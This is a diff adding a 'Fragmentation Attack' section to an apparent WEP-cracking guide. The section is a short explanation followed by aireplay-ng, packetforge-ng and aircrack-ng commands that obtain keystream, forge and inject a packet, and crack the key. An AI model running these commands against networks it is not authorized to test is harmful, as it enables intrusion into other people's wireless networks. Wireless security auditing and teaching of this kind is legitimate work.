@@ -64,4 +64,38 @@ OR
 
 2.3 Fragmentation Attack
 
+The goal of this method is to obtain 1500 bytes of the PRGA,
+this can be used to forge a new packet which can be injected into the traffic to generate new IV's.
+
+TERM3 => #aireplay-ng --fragment -b [target MAC] -h [your MAC] [MonitorModeInterface]        // Obtain PRGA
+TERM3 => #packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [out from last step.xor] -w [output] //Forge a new packet
+TERM3 => #aireplay-ng -2 -r [out from last step] [MonitorModeInterface]                     // Inject the forged packet into the traffic to generate new IVs.
+TERM4 => #aircrack-ng [FileName_test.cap]     // data reach aroun 20,000
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
